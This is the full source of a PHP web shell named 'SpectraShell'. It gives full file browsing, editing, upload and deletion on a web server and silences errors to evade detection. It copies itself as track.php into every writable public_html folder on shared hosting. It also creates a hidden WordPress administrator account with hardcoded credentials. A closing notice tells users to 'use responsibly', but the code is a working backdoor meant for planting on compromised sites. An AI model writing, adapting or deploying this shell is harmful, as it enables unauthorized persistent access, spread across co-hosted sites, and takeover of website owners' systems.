<?php
// 🌌 SpectraShell — Replicating PHP Shell (Clones hide URLs, but replicate + inject WP user)
// 🤖 This is a file manager with self-replicating capabilities and WordPress admin creation
// 💀 Warning: This script can modify files and create admin users - use with caution!

error_reporting(0); // 🔇 Silence all errors to avoid detection

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd(); // 📍 Get current path or requested path
if (!$path || !is_dir($path)) $path = getcwd(); // 🛡️ Fallback to current directory if path is invalid

// === Handle Delete Operation ===
// 🗑️ This section handles file/folder deletion with security checks
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']); // 🔍 Get absolute path of target
    // 🛡️ Security check: ensure target is within current working directory
    if ($target && strpos($target, getcwd()) === 0 && file_exists($target)) {
        if (is_dir($target)) {
            rmdir($target); // 📁 Delete directory
        } else {
            unlink($target); // 📄 Delete file
        }
        echo "<p style='color:#f66;'>🗑️ Deleted: " . htmlspecialchars(basename($target)) . "</p>"; // ✅ Confirmation message
    }
}

// === Breadcrumb Navigation UI ===
// 🧭 Creates clickable path navigation like Windows/Mac file explorers
function breadcrumb($path) {
    $parts = explode('/', trim($path, '/')); // 🔪 Split path into segments
    $built = '/'; // 🏗️ Start building path from root
    $html = "<strong>Current path:</strong> "; // 📝 HTML output buffer
    foreach ($parts as $part) {
        $built .= "$part/"; // 🔨 Add current segment to built path
        $html .= "<a href='?path=" . urlencode($built) . "'>$part</a>/"; // 🔗 Create clickable link
    }
    return $html; // 🎯 Return the breadcrumb HTML
}

// === Directory Listing Function ===
// 📂 Lists folders and files with actions (view, edit, delete)
function list_dir($path) {
    $out = ''; // 📦 Initialize output buffer
    $folders = $files = []; // 🗂️ Separate arrays for folders and files
    
    // 🔍 Scan directory contents
    foreach (scandir($path) as $item) {
        if ($item === '.' || $item === '..') continue; // ⏭️ Skip navigation entries
        $full = "$path/$item"; // 📍 Full path to item
        if (is_dir($full)) $folders[] = $item; // 📁 Add to folders array
        else $files[] = $item; // 📄 Add to files array
    }
    
    natcasesort($folders); // 🔤 Sort folders alphabetically (case-insensitive)
    natcasesort($files);   // 🔤 Sort files alphabetically (case-insensitive)

    // 📁 Display folders first with folder icon
    foreach ($folders as $f) {
        $full = "$path/$f";
        $out .= "<li>📁 <a href='?path=" . urlencode($full) . "'>$f</a> 
        | <a href='?delete=" . urlencode($full) . "' onclick=\"return confirm('Delete this folder?')\" style='color:#f66;'>🗑️ Delete</a></li>";
    }
    
    // 📄 Display files with view/edit/delete options
    foreach ($files as $f) {
        $full = "$path/$f";
        $out .= "<li>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($f) . "'>$f</a> 
        | <a href='?path=" . urlencode($path) . "&edit=" . urlencode($f) . "' style='color:#6cf'>✏️ Edit</a> 
        | <a href='?delete=" . urlencode($full) . "' onclick=\"return confirm('Delete this file?')\" style='color:#f66;'>🗑️ Delete</a></li>";
    }
    return $out; // 🎯 Return the formatted list
}

// === File Viewer Function ===
// 👀 Displays file contents in a readable format
function view_file($path, $file) {
    $full = "$path/$file"; // 📍 Full path to file
    if (!is_file($full)) return; // 🛡️ Check if it's actually a file
    
    echo "<h3>📄 Viewing: $file</h3><pre style='background:#111;padding:10px;color:#6f6;border:1px solid #444;'>";
    echo htmlspecialchars(file_get_contents($full)); // 🔒 Safe output with HTML escaping
    echo "</pre><hr>"; // 📏 Horizontal separator
}

// === File Editor Function ===
// ✏️ Allows editing file contents with save functionality
function edit_file($path, $file) {
    $full = "$path/$file"; // 📍 Full path to file
    if (!is_file($full)) return; // 🛡️ Check if it's actually a file
    
    // 💾 Handle form submission to save changes
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($full, $_POST['content']); // 📝 Write new content to file
        echo "<p style='color:#0f0;'>✅ Saved</p>"; // ✅ Success message
    }
    
    $code = htmlspecialchars(file_get_contents($full)); // 🔒 Escape existing content for safe display
    echo "<h3>✏️ Editing: $file</h3>
    <form method='post'>
        <textarea name='content' rows='20' style='width:100%;background:#111;color:#fff;'>$code</textarea><br>
        <button type='submit'>Save</button> <!-- 💾 Save button -->
    </form><hr>"; // 📏 Horizontal separator
}

// === Upload and Create Folder Functions ===
// 📤 Handles file uploads and folder creation
function upload_and_mkdir($path) {
    // 📤 Handle file upload
    if (!empty($_FILES['up']['name'])) {
        move_uploaded_file($_FILES['up']['tmp_name'], "$path/" . basename($_FILES['up']['name']));
        echo "<p style='color:#0f0;'>📤 Uploaded</p>"; // ✅ Upload success message
    }
    
    // 📁 Handle folder creation
    if (!empty($_POST['mkdir'])) {
        $target = "$path/" . basename($_POST['mkdir']); // 🎯 Target folder path
        if (!file_exists($target)) {
            mkdir($target); // 📂 Create new directory
            echo "<p style='color:#0f0;'>📁 Folder created</p>"; // ✅ Success message
        } else {
            echo "<p style='color:#f66;'>❌ Folder exists</p>"; // ❌ Error message
        }
    }
    
    // 📝 Display upload and folder creation forms
    echo "<form method='post' enctype='multipart/form-data'>
        <input type='file' name='up'> <button>Upload</button></form><br>
    <form method='post'>
        📁 <input type='text' name='mkdir'> <button>Create Folder</button></form><br>";
}

// === Self-Replication Function ===
// 🐑 Creates copies of itself in other directories (clone functionality)
function replicate_self($code) {
    static $done = false; // 🚫 Prevent multiple replications in one execution
    if ($done) return [];
    $done = true;
    
    $dir = __DIR__; // 📍 Start from current directory
    
    // 🔍 Search for appropriate directories to clone into
    while ($dir !== '/') {
        // 🎯 Look for pattern matching hosting directory structures
        if (preg_match('/\/u[\w\d]+$/', $dir) && is_dir("$dir/domains")) {
            $base = "$dir/domains"; // 🏠 Base domains directory
            $urls = []; // 🌐 Store generated URLs
            
            // 🔍 Scan through all domains
            foreach (scandir($base) as $d) {
                if ($d === '.' || $d === '..') continue; // ⏭️ Skip navigation entries
                $targetDir = "$base/$d/public_html"; // 🎯 Target web directory
                $targetFile = "$targetDir/track.php"; // 📄 Target file name
                
                // ✅ Check if directory is writable and exists
                if (is_dir($targetDir) && is_writable($targetDir)) {
                    if (file_put_contents($targetFile, $code)) { // 📝 Write clone file
                        $urls[] = "http://$d/track.php"; // 🌐 Add to URL list
                    }
                }
            }
            return $urls; // 🎯 Return list of cloned URLs
        }
        $dir = dirname($dir); // ⬆️ Move up one directory level
    }
    return []; // 🎯 Return empty array if no clones created
}

// === WordPress Admin Creation Function ===
// 👤 Creates WordPress administrator user with predefined credentials
function handle_wp_injection($path) {
    if (!isset($_GET['create_wp_user'])) return; // 🚫 Exit if button not clicked

    $wp = $path; // 📍 Start search from current path
    
    // 🔍 Find WordPress root directory by looking for wp-config.php
    while ($wp !== '/') {
        if (file_exists("$wp/wp-config.php")) break; // 🎯 Found WordPress!
        $wp = dirname($wp); // ⬆️ Move up one level
    }

    // ❌ Check if WordPress was actually found
    if (!file_exists("$wp/wp-load.php")) {
        echo "<p style='color:#f66;'>❌ WordPress not found.</p>";
        return;
    }

    require_once("$wp/wp-load.php"); // 🔌 Load WordPress environment

    $user = 'savvy'; // 👤 Username to create
    $pass = 'SavvyMrx#'; // 🔑 Password for new user
    $mail = 'savvy@domain.com'; // 📧 Email for new user

    // ✅ Check if user/email doesn't already exist
    if (!username_exists($user) && !email_exists($mail)) {
        $uid = wp_create_user($user, $pass, $mail); // 👤 Create WordPress user
        $wp_user = new WP_User($uid); // 🔧 Get user object
        $wp_user->set_role('administrator'); // ⭐ Set as administrator
        echo "<p style='color:#0f0;'>✅ WP Admin user 'savvy' created.</p>"; // ✅ Success message
    } else {
        echo "<p style='color:#ff0;'>⚠️ User/email already exists.</p>"; // ⚠️ Warning message
    }
}

// === HTML Page Generation Starts Here ===
// 🎨 Begin outputting the HTML interface
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>🌌 SpectraShell</title>
<style>
body { background:#101010; color:#ddd; font-family:monospace; padding:20px; max-width:900px; margin:auto; }
a { color:#6cf; text-decoration:none; } a:hover { text-decoration:underline; }
pre, textarea { width:100%; background:#1a1a1a; color:#eee; border:1px solid #333; }
button { background:#6cf; border:none; color:#000; padding:6px 12px; margin-top:5px; }
ul { list-style:none; padding:0; }
</style></head><body>
<h2>🌌 SpectraShell</h2><p>" . breadcrumb($path) . "</p><hr>";

// === WordPress Admin Creation Button ===
// 👤 Display button to create WordPress admin user
echo "<form method='get'>
    <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
    <button name='create_wp_user' value='1'>👤 Create WP Admin</button>
</form><br>";

handle_wp_injection($path); // 🔧 Handle WP user creation if button clicked

// === Self-Replication Section ===
// 🐑 Only show clone URLs if this is the original shell (not a clone)
if (basename(__FILE__) !== 'track.php') {
    $code = file_get_contents(__FILE__); // 📖 Read current file's code
    $clones = replicate_self($code); // 🔄 Create clones
    if (!empty($clones)) {
        echo "<p style='color:#0f0;'>✅ Cloned to:</p><ul>"; // ✅ Cloning success
        foreach ($clones as $u) echo "<li><a href='$u' target='_blank'>$u</a></li>"; // 🌐 Display clone URLs
        echo "</ul><hr>"; // 📏 Horizontal separator
    }
}

// === Navigation: Go Up One Level ===
// ⬆️ Provide link to parent directory
$up = dirname($path);
if ($up && $up !== $path) echo "<p>⬆️ <a href='?path=" . urlencode($up) . "'>Go up: $up</a></p>";

// === Handle View/Edit Operations ===
// 👀 Display file viewer or editor based on URL parameters
if (isset($_GET['view'])) view_file($path, basename($_GET['view'])); // 👀 View file
if (isset($_GET['edit'])) edit_file($path, basename($_GET['edit'])); // ✏️ Edit file

// === Display Upload/Create Forms and Directory Listing ===
upload_and_mkdir($path); // 📤 Show upload and folder creation
echo "<ul>" . list_dir($path) . "</ul>"; // 📂 Show directory contents

echo "</body></html>"; // 🏁 End of HTML document
?> 
<!-- 
💡 SpectraShell Features:
✅ File browsing and navigation
✅ File viewing and editing  
✅ File upload and deletion
✅ Folder creation and deletion
✅ WordPress admin user creation
✅ Self-replication to other directories
✅ Dark theme interface
✅ Security path validation
✅ Error suppression for stealth
-->

<!-- 
🚨 Security Notice:
This tool can be dangerous in wrong hands. It allows:
- Full file system access
- WordPress admin creation
- Self-replication capabilities
Use responsibly and only on systems you own!
-->